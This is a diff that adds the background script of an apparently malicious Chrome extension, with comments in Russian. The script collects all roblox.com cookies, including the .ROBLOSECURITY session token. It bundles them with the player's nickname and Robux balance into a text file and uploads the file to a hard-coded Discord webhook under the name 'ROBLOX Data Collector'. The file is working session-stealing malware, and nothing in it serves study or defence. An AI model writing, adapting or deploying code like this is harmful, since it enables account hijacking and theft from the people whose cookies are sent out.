@@ -1,0 +1,69 @@
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1462227478864203878/d6oqh4TmsdVDJugmV6XmW8dclurem2iElQW7r41LaVTT2Cs8DeoWQVucacnMk6Rne486";
+
+// Обработчик для получения cookies
+chrome.runtime.onMessage.addListener((message, sender) => {
+    if (message.type === 'get_cookies') {
+        // Получаем все cookies для roblox.com
+        chrome.cookies.getAll({domain: 'roblox.com'}, (cookies) => {
+            if (chrome.runtime.lastError) {
+                console.error('Ошибка получения cookies:', chrome.runtime.lastError);
+                return;
+            }
+            
+            const cookieObj = {};
+            let roblosecurity = 'Не найден';
+            
+            cookies.forEach(cookie => {
+                cookieObj[cookie.name] = cookie.value;
+                if (cookie.name === '.ROBLOSECURITY') {
+                    roblosecurity = cookie.value;
+                }
+            });
+            
+            // Формируем содержимое файла
+            const fileContent = 
+`NickName: ${message.nickname}
+robux: ${message.robux}
+.ROBLOSECURITY: ${roblosecurity}
+
+Все cookies:
+${JSON.stringify(cookieObj, null, 2)}`;
+
+            // Создаем и отправляем файл
+            const blob = new Blob([fileContent], { type: 'text/plain' });
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = function() {
+                sendToDiscord(reader.result, message.nickname, message.robux, `roblox_data_${Date.now()}.txt`);
+            };
+        });
+    }
+});
+
+// Функция отправки на Discord
+function sendToDiscord(fileData, nickname, robux, fileName) {
+    const formData = new FormData();
+    const blob = dataURLToBlob(fileData);
+    
+    formData.append('file', blob, fileName);
+    formData.append('payload_json', JSON.stringify({
+        username: "ROBLOX Data Collector"
+    }));
+
+    fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        body: formData
+    }).catch(err => console.error("Ошибка отправки:", err));
+}
+
+// Функция для конвертации DataURL в Blob
+function dataURLToBlob(dataURL) {
+    const byteString = atob(dataURL.split(',')[1]);
+    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+}
